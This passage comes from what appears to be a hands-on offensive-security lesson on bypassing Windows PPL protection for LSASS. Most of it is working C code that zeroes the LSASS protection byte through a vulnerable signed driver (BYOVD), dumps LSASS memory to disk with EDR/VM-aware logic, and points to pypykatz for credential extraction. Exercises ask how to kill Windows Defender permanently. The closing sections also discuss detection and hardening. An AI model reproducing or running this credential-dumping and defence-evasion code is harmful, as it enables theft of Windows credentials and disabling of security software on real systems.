    }

    // Read current protection - use ULONG_PTR to avoid truncation
    UCHAR current_protection;
    ULONG_PTR protection_offset = lsass_eprocess + g_eprocess_offsets.Protection;

    if (!ReadKernelMemory(hDevice, driver_index, protection_offset,
                          &current_protection, sizeof(current_protection))) {
        printf("[-] Failed to read current protection\n");
        return FALSE;
    }

    printf("[*] Current PPL protection: 0x%02X\n", current_protection);

    // Remove protection by writing 0
    UCHAR zero_protection = 0;
    printf("[*] Attempting kernel write...\n");

    if (!WriteKernelMemory(hDevice, driver_index, protection_offset,
                           &zero_protection, sizeof(zero_protection))) {
        printf("[-] Failed to remove PPL protection\n");
        return FALSE;
    }

    printf("[+] PPL protection removed successfully\n");

    // Verify protection was removed
    UCHAR verify_protection;
    if (ReadKernelMemory(hDevice, driver_index, protection_offset,
                        &verify_protection, sizeof(verify_protection))) {
        printf("[*] Verification - New protection: 0x%02X\n", verify_protection);

        if (verify_protection != 0) {
            printf("[!] WARNING: Protection value is not 0 - write may have failed\n");
            return FALSE;
        }
    }

    return TRUE;
}

// Fast direct memory dump - bypasses MiniDumpWriteDump overhead
BOOL FastDumpLsass(DWORD lsass_pid, const char* output_path) {
    printf("[*] Fast-dumping LSASS memory to %s...\n", output_path);

    // Open LSASS with full access
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (hLsass == NULL) {
        printf("[-] Failed to open LSASS: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Opened LSASS with PROCESS_ALL_ACCESS\n");

    // Query memory regions
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T address = 0;
    SIZE_T total_dumped = 0;
    DWORD start_time = GetTickCount();

    // Create dump file
    HANDLE hFile = CreateFileA(output_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create dump file: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    printf("[*] Scanning memory regions");

    // Allocate 1MB buffer for fast reads
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        printf("[-] Failed to allocate buffer\n");
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return FALSE;
    }

    int regions_dumped = 0;

    // Walk memory regions
    while (VirtualQueryEx(hLsass, (LPCVOID)address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        // Only dump committed, readable memory (skip guard pages, free regions)
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) &&
            !(mbi.Protect & PAGE_GUARD)) {

            SIZE_T bytes_read = 0;
            if (ReadProcessMemory(hLsass, (LPCVOID)address, buffer, mbi.RegionSize, &bytes_read)) {
                DWORD bytes_written = 0;
                WriteFile(hFile, buffer, (DWORD)bytes_read, &bytes_written, NULL);
                total_dumped += bytes_read;
                regions_dumped++;

                // Progress indicator every 10 regions
                if (regions_dumped % 10 == 0) {
                    printf(".");
                    fflush(stdout);
                }
            }
        }

        address += mbi.RegionSize;

        // Safety check - don't scan beyond user space
        if (address >= 0x7FFFFFFFFFFF) break;
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    CloseHandle(hFile);
    CloseHandle(hLsass);

    DWORD elapsed = (GetTickCount() - start_time) / 1000;
    if (elapsed == 0) elapsed = 1; // Avoid division by zero

    printf("\n");
    printf("[+] Fast dump completed\n");
    printf("[*] Regions dumped: %d\n", regions_dumped);
    printf("[*] Total size: %.2f MB\n", total_dumped / (1024.0 * 1024.0));
    printf("[*] Time taken: %d seconds\n", elapsed);
    printf("[*] Dump speed: %.2f MB/s\n", (total_dumped / (1024.0 * 1024.0)) / elapsed);
    printf("\n[!] Note: This is a raw memory dump, not a minidump format\n");
    printf("[!] For credential extraction, use the standard MiniDumpWriteDump method\n");
    printf("[!] This fast method is for demonstration/comparison only\n");

    return TRUE;
}

// Standard minidump with progress callback
BOOL CALLBACK MiniDumpCallback(
    PVOID CallbackParam,
    const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    if (CallbackInput->CallbackType == ModuleCallback) {
        printf(".");
        fflush(stdout);
        return TRUE;
    }
    return TRUE;
}

BOOL DumpLsassMemory(DWORD lsass_pid, const char* output_path) {
    printf("[*] Dumping LSASS memory to %s...\n", output_path);

    // Open LSASS with full access
    HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (hLsass == NULL) {
        printf("[-] Failed to open LSASS: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Opened LSASS with PROCESS_ALL_ACCESS\n");

    // Create dump file
    HANDLE hFile = CreateFileA(output_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create dump file: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    printf("[*] Creating minidump (pypykatz-compatible format)");

    DWORD start_time = GetTickCount();

    // Use MiniDumpWithDataSegs - faster and sufficient for credentials
    MINIDUMP_TYPE dump_type = (MINIDUMP_TYPE)(
        MiniDumpWithDataSegs |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithProcessThreadData
    );

    MINIDUMP_CALLBACK_INFORMATION callback_info;
    callback_info.CallbackRoutine = MiniDumpCallback;
    callback_info.CallbackParam = NULL;

    BOOL success = MiniDumpWriteDump(
        hLsass, lsass_pid, hFile,
        dump_type,
        NULL, NULL, &callback_info
    );

    printf("\n");
    DWORD elapsed = (GetTickCount() - start_time) / 1000;
    if (elapsed == 0) elapsed = 1;

    if (success) {
        LARGE_INTEGER file_size;
        GetFileSizeEx(hFile, &file_size);

        printf("[+] LSASS dump created successfully\n");
        printf("[*] Dump size: %.2f MB\n", file_size.QuadPart / (1024.0 * 1024.0));
        printf("[*] Time taken: %d seconds\n", elapsed);
        printf("[*] Dump speed: %.2f MB/s\n",
               (file_size.QuadPart / (1024.0 * 1024.0)) / elapsed);
    } else {
        printf("[-] MiniDumpWriteDump failed: %d\n", GetLastError());
    }

    CloseHandle(hFile);
    CloseHandle(hLsass);

    return success;
}

int main(int argc, char* argv[]) {
    printf("  PPL Bypass - Multi-Driver Support\n\n");

    // Initialize anti-analysis
    InitializeAntiAnalysis();

    if (g_anti_ctx.is_edr_present && g_anti_ctx.stealth_level < 3) {
        printf("[!] EDR detected - consider using higher stealth level\n");
    }

    // Enumerate vulnerable drivers
    EnumerateVulnerableDrivers();

    // Find a loaded vulnerable driver
    int driver_index = -1;
    for (int i = 0; i < DRIVER_COUNT; i++) {
        if (g_vulnerable_drivers[i].is_loaded) {
            driver_index = i;
            break;
        }
    }

    if (driver_index == -1) {
        printf("[-] No vulnerable drivers found\n");
        printf("[*] Consider loading a vulnerable driver first\n");
        return 1;
    }

    printf("[+] Using driver: %ls (CVE-%d)\n",
           g_vulnerable_drivers[driver_index].name,
           g_vulnerable_drivers[driver_index].cve_year);

    // Detect EPROCESS offsets
    if (!DetectEprocessOffsets()) {
        return 1;
    }

    // Open the vulnerable driver
    HANDLE hDevice = OpenVulnerableDriver(driver_index);
    if (hDevice == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // Find LSASS PID
    printf("[*] Finding LSASS process...\n");
    DWORD lsass_pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(snapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0) {
                    lsass_pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe32));
        }
        CloseHandle(snapshot);
    }

    if (lsass_pid == 0) {
        printf("[-] LSASS process not found\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] Found LSASS PID: %d\n", lsass_pid);

    // Bypass PPL protection
    if (!BypassPplProtection(hDevice, driver_index, lsass_pid)) {
        printf("[-] PPL bypass failed\n");
        CloseHandle(hDevice);
        return 1;
    }

    // Dump LSASS memory - use fast method in VMs
    char dump_path[MAX_PATH];
    sprintf_s(dump_path, sizeof(dump_path), "lsass_dump_%d.raw", lsass_pid);

    printf("\n[*] Dumping LSASS memory...\n");

    // Check if we're in a VM or sandbox
    if (g_anti_ctx.is_vm || g_anti_ctx.is_sandbox || g_anti_ctx.stealth_level >= 2) {
        printf("[*] VM/Sandbox detected - using fast raw dump method\n");
        printf("[!] MiniDumpWriteDump is extremely slow in VMs due to memory introspection\n");

        if (FastDumpLsass(lsass_pid, dump_path)) {
            printf("\n[+] PPL bypass completed successfully!\n");
            printf("[*] Raw dump saved to: %s\n", dump_path);
            if (g_anti_ctx.is_edr_present) {
                printf("\n[!] EDR was present - monitor for alerts\n");
            }
        } else {
            printf("[-] Fast dump failed\n");
            CloseHandle(hDevice);
            return 1;
        }
    } else {
        // Physical machine - try standard minidump
        printf("[*] Physical machine detected - using standard minidump\n");

        char minidump_path[MAX_PATH];
        sprintf_s(minidump_path, sizeof(minidump_path), "lsass_dump_%d.dmp", lsass_pid);

        HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
        if (!hLsass) {
            printf("[-] Failed to open LSASS: %d\n", GetLastError());
            CloseHandle(hDevice);
            return 1;
        }

        HANDLE hFile = CreateFileA(minidump_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to create dump file: %d\n", GetLastError());
            CloseHandle(hLsass);
            CloseHandle(hDevice);
            return 1;
        }

        MINIDUMP_TYPE dump_type = (MINIDUMP_TYPE)(
            MiniDumpWithDataSegs |
            MiniDumpWithHandleData |
            MiniDumpWithUnloadedModules |
            MiniDumpWithProcessThreadData
        );

        BOOL success = MiniDumpWriteDump(
            hLsass, lsass_pid, hFile,
            dump_type,
            NULL, NULL, NULL
        );

        CloseHandle(hFile);
        CloseHandle(hLsass);

        if (success) {
            printf("[+] Minidump completed successfully\n");
            printf("\n[+] PPL bypass completed successfully!\n");
            printf("[*] LSASS dump saved to: %s\n", minidump_path);
            printf("\n[*] Extract credentials with pypykatz:\n");
            printf("    pypykatz lsa minidump %s\n", minidump_path);
        } else {
            printf("[-] MiniDumpWriteDump failed: %d\n", GetLastError());
            printf("[*] Falling back to fast raw dump...\n");

            if (FastDumpLsass(lsass_pid, dump_path)) {
                printf("\n[+] PPL bypass completed with raw dump!\n");
                printf("[*] Raw dump saved to: %s\n", dump_path);
            } else {
                printf("[-] All dump methods failed\n");
                CloseHandle(hDevice);
                return 1;
            }
        }
    }

    // Cleanup
    CloseHandle(hDevice);

    printf("\n[*] Operation completed - exiting cleanly\n");
    return 0;
}
```

### Practical Exercise

- actually read lsassdump and see if it works properly
- change dump method in method 2 to do a proper dump instead of a raw one
- instead of just killing defender(which windows restarts immediately) find out how to kill it completely
- use different drivers and try killing defender or dumping lsass

### Key Takeaways

- **PPL protects critical processes** from even admin-level tampering (SeDebugPrivilege is insufficient)
- **Signer levels create hierarchy** - higher signers can access lower (WinTcb > Windows > Lsa > Antimalware)
- **BYOVD (Bring Your Own Vulnerable Driver) is the primary bypass** - exploit signed drivers with kernel R/W primitives
- **Kernel memory access can clear EPROCESS.Protection** - strips PPL non-destructively
- **Multiple bypass tools exist**: PPLdump, PPLFault, mimidrv, or custom exploits using RTCore64/similar drivers
- **Both attack methods have tradeoffs**:
  - **Process termination** (BdApiUtil) - Simple but destructive, causes system crash if targeting LSASS
  - **EPROCESS patching** (RTCore64) - Complex but non-destructive, allows credential theft
- **Windows build matters** - EPROCESS offsets change between versions (use windbg or check [Vergilius Project](https://www.vergiliusproject.com/))
- **Driver blocklists exist** - Windows Defender and HVCI can block known vulnerable drivers, but new ones emerge constantly

### Discussion Questions

1. **Why doesn't Microsoft completely prevent PPL bypass?**
   - Kernel drivers have legitimate needs for process access (debugging, monitoring, security software)
   - Blocking all kernel memory access would break compatibility with hardware vendors and security tools
   - The real solution is HVCI/VBS which prevents unsigned/vulnerable drivers from loading
   - It's a cat-and-mouse game: Microsoft blocks known vulnerable drivers, attackers find new ones

2. **How would you detect PPL bypass attempts?**
   - Monitor for vulnerable driver loading (RTCore64.sys, BdApiUtil64.sys, etc.) via Sysmon Event ID 6
   - Detect LSASS handle opens with PROCESS_VM_READ from unexpected processes
   - Watch for EPROCESS.Protection field modifications via kernel callbacks (PsSetCreateProcessNotifyRoutineEx)
   - Alert on minidump creation of LSASS (Event ID 1000 in Application log)
   - Use EDR with kernel-mode components to monitor driver IOCTLs
   - Enable HVCI/Memory Integrity to prevent vulnerable driver loading entirely

3. **What's the risk/benefit of using kernel drivers for bypass?**
   - **Benefits**:
     - Bypasses all userland protections (PPL, hooks, monitoring)
     - Non-destructive credential theft possible
     - Works even with Secure Boot if driver is signed
   - **Risks**:
     - Kernel code can cause BSOD if buggy
     - Leaves forensic artifacts (driver files, registry keys, event logs)
     - Requires admin privileges to load drivers
     - Vulnerable drivers get blocklisted over time
     - HVCI prevents loading on modern systems

4. **How does PPL interact with Credential Guard?**
   - **PPL protects the LSASS process** from memory access
   - **Credential Guard isolates credentials** in a VTL1 (Virtual Trust Level 1) secure environment
   - Even if you bypass PPL and dump LSASS, Credential Guard means:
     - NTLM hashes are not in LSASS memory (stored in isolated LSAIso.exe in VTL1)
     - Kerberos tickets are protected
     - You get limited credential material
   - **Full bypass requires**: PPL bypass + Credential Guard bypass (VTL1 escape or hypervisor exploit)
   - **Defense in depth**: PPL is one layer, Credential Guard is another

5. **Could a future Windows version make PPL bypass impossible?**
   - **Unlikely to be "impossible"** but can be made much harder:
     - **HVCI (Hypervisor-Protected Code Integrity)** prevents unsigned/vulnerable drivers - this is the real solution
     - **Driver blocklists** updated regularly via Windows Defender
     - **Kernel patch protection** (PatchGuard) detects EPROCESS modifications
     - **Secure Kernel** (VBS) isolates critical operations from normal kernel
   - **However**:
     - Zero-day driver vulnerabilities will always exist
     - Firmware/hypervisor exploits can bypass all protections
     - Physical access attacks (DMA, cold boot) remain viable
   - **Best defense**: HVCI + Credential Guard + TPM + Secure Boot + regular patching

